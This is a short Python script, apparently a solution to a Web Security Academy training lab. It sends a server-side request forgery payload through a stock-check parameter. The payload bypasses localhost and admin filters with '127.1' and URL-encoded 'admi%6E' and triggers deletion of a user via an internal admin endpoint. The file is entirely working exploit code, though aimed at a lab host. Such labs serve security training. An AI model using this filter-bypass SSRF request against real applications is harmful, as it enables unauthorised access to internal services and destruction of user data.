import requests

site = "https://0aa800e803c590418018fd7b000c0014.web-security-academy.net"
stock_url = f"{site}/product/stock"

# This is the SSRF payload:
# - Bypass localhost filter using 127.1
# - Bypass admin filter using admi%6E
payload = "http://127.1/admi%6E/delete?username=carlos"

data = {
    "stockApi": payload
}

resp = requests.post(stock_url, data=data)
print("[✓] SSRF POST response:")
print(resp.text)
